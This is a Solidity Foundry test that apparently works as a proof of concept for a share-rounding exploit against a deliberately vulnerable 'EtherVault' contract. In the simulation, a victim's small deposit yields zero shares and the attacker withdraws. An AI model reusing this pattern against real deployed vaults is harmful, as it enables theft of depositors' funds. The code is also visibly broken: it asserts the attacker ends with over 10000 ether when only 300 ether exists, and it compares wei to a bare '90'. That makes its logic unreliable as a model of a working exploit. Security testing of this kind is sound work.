// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";
import "forge-std/Test.sol";
import {EtherVault} from "../src/Vuln.sol";

contract bugTest is Test {

    //This is setup, to deploy smart contract, and look for un-expected results
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");
    address public user = makeAddr("user");
        EtherVault bugTesterObject;

    function setUp() public {
        bugTesterObject = new EtherVault();
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
        vm.deal(user, 100 ether);
}

    function test_deposit() public {

        vm.prank(attacker);

        bugTesterObject.deposit{value: 5 ether}(); //should send 5 ether

        uint balanceOfContractUnderTest = bugTesterObject.balance();

                bool deposited=true;
                bool stateOfDeposition=false;

        if(balanceOfContractUnderTest > 90){
                stateOfDeposition=true;
        }

        vm.prank(user);
         bugTesterObject.deposit{value: 50 ether}();
         uint attackerShares=bugTesterObject.getShares(attacker);
         console.log("Attacker Shares are ", attackerShares);
        // assertEq(deposited, stateOfDeposition);
        vm.prank(victim);
        bugTesterObject.deposit{value: 2}();
        bool exploitWorked = false;

        uint victimShares=bugTesterObject.getShares(victim);

        if(victimShares==0){
                exploitWorked=true;
        }

        uint userShares=bugTesterObject.getShares(user);

        console.log("Vicim Shares are ", victimShares);
        console.log("User Shares are", userShares);

        assertEq(exploitWorked, true);
        

        uint attackerSharesToWithdraw=bugTesterObject.getShares(attacker);


        vm.prank(attacker);
        bugTesterObject.withdraw(attackerSharesToWithdraw);


        bool SharesRemoved=false;

        if(bugTesterObject.getShares(attacker)==0){
                SharesRemoved=true;
                console.log("All shares are removed", bugTesterObject.getShares(attacker));
        }
	
	assertGt(attacker.balance, 10000 ether);
	console.log("attacker balance", attacker.balance);
        assertEq(SharesRemoved, true);
    }

}
